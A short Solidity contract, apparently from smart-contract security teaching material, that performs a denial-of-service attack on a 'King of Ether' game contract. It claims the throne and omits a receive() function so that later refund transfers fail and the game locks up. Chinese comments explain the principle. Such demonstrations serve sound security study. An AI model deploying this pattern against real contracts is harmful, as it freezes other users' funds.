// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "./KingOfEther.sol";

/**
 * KingOfEtherAttack - DoS 攻击合约
 * 
 * 攻击原理：
 * 成为国王后，让合约没有 receive() 函数
 * 这样当新的挑战者想要成为国王时，向这个合约转账会失败
 * 导致 KingOfEther 合约卡死
 */
contract KingOfEtherAttack {
    KingOfEther public kingOfEther;
    address public attacker;
    
    /**
     * 构造函数 - 成为国王
     */
    constructor(address _kingOfEther) payable {
        kingOfEther = KingOfEther(_kingOfEther);
        attacker = msg.sender;
        
        // 直接存入 ETH 成为国王
        kingOfEther.claimThrone{value: msg.value}();
    }
    
    /**
     * 注意：没有 receive() 函数！
     * 这样当向这个合约转账时会失败
     */
    
    /**
     * attack - 尝试再次攻击（可选，用于增加锁定金额）
     */
    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
